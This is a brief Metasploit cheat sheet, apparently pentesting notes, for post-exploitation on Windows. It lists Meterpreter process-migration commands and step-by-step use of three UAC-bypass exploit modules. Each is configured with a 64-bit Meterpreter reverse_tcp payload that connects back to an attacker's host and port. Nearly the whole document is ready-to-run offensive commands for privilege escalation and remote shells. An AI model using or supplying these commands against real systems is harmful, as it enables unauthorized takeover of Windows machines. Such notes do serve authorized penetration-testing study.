# Metasploit

- Migrate to a 64-bit process ID architecture in order to perform privilege escalation

```
meterpreter > migrate <pid>
meterpreter > migrate -N explorer.exe
meterpreter > background
```

There are two MSF modules for **BypassUAC**

- This uses a payload as a dropper (this will touch the disk)

```
msf exploit(multi/handler) > use exploit/windows/local/bypassuac

msf exploit(windows/local/bypassuac) > set payload /windows/x64/meterpreter/reverse_tcp

msf exploit(windows/local/bypassuac) > set target Windows x64

msf exploit(windows/local/bypassuac) > run lhost=<IP> lport=<PORT> session=<session_id>
```

- This will execute it through memory

```
msf exploit(multi/handler) > use exploit/windows/local/bypassuac_injection

msf exploit(windows/local/bypassuac_injection) > set payload /windows/x64/meterpreter/reverse_tcp

msf exploit(windows/local/bypassuac_injection) > set target Windows x64

msf exploit(windows/local/bypassuac_injection) > run lhost=<IP> lport=<PORT> session=<session_id>
```

- Performing Privilege escalation that abuses WinSXS

```
msf exploit(multi/handler) > use exploit/windows/local/bypassuac_injection_winsxs

msf exploit(windows/local/bypassuac_injection_winsxs) > set payload /windows/x64/meterpreter/reverse_tcp

msf exploit(windows/local/bypassuac_injection_winsxs) > set target Windows x64

msf exploit(windows/local/bypassuac_injection_winsxs) > run lhost=<IP> lport=<PORT> session=<session_id>
```